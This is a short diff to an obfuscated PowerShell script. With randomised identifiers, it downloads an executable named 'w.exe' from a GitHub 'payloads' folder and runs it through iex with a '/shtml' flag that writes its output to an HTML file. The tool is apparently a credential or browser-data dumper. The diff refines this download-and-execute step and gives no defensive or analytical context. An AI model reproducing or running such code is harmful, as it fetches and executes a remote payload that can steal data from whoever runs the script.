@@ -4,8 +4,10 @@ function uCmLBUkWvE {
 
 }
 
-$TcDrgEHOCo = uCmLBUkWvE + '.exe'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/w.exe' -OutFile $TcDrgEHOCo
+$TcDrgEHOCo = uCmLBUkWvE
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads/w.exe' -OutFile "$TcDrgEHOCo.exe"
+
+Start-Sleep 2
 
 $zXMpyWDQjY = uCmLBUkWvE
-./$TcDrgEHOCo'.exe' /shtml $zXMpyWDQjY'.html'
+iex "./$TcDrgEHOCo.exe /shtml $zXMpyWDQjY.html"
